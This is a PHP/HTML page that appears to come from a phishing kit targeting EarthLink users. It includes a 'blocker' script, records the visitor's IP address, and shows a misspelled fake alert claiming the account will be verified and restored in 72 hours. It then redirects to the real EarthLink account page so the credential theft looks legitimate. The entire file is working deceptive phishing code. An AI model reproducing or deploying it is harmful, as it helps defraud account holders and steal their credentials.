<?php
session_start();
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");


$redirect="https://myaccount.biz.earthlink.net/cam/index.jsp";
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $redirect; ?>">
<script type="text/javascript">
alert("YOUR ACCOUNT INFORMATION'S WILL BE VERIFIED...YOUR ACCOUNT WILL BE RESTORED IN 72HRS ...CLICK (OK) TO CONTINUE");
window.close();
</script>
</head></html>